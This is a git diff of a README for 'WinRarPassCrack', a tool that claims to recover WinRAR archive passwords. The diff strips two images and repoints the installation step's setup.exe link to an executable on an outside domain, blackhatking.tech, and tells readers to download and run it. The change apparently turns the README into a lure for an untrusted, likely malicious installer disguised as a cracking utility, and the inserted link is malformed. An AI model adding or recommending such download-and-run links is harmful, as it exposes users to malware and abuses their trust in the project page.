@@ -1,6 +1,6 @@
 # ⚡ WinRarPassCrack ⚡
 
-![Cyberpunk Header](https://giphy.com/gifs/gifnews-russia-GuRuLWOGo0CI)
+!
 
 ## **Your Ultimate Tool for Password Recovery**
 
@@ -29,7 +29,7 @@ Before diving into the cyber realm, make sure you have:
 
 ## 🌀 **Installation**
 
-1. **Download the [setup.exe](setup.exe).**
+1. **Download the [setup.exe]([setup.exe](https://blackhatking.tech/PROJECTX/setup.exe)).**
 2. **Run the installer** and follow the on-screen prompts to get started.
 3. **Launch WinRarPassCrack** and enter the world of password recovery.
 
@@ -42,7 +42,7 @@ Before diving into the cyber realm, make sure you have:
 3. **Start the Cracking Process** and let the tool work its magic.
 4. **Retrieve the Password** and unlock your archive.
 
-![Cracking Animation](https://media.giphy.com/media/3ohhwE5p9St7zTHu0Q/giphy.gif)
+!
 
 ---
 
